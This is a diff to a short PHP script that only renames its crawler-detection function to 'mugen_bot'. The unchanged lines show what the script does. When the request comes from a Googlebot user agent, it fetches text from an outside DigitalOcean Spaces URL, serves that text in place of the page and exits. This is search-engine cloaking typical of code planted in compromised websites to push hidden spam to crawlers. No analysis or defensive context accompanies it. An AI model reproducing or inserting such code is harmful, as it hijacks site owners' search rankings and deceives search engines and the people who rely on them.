@@ -1,5 +1,5 @@
 <?php
-function is_google_bot() {
+function mugen_bot() {
     $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
     foreach ($agents as $agent) {
@@ -11,7 +11,7 @@ function is_google_bot() {
 }
 
 $request_uri = $_SERVER['REQUEST_URI'];
-if (is_google_bot()) {
+if (mugen_bot()) {
     echo file_get_contents("https://keren.sgp1.cdn.digitaloceanspaces.com/text/thepainclinic.txt");
     exit;
 }
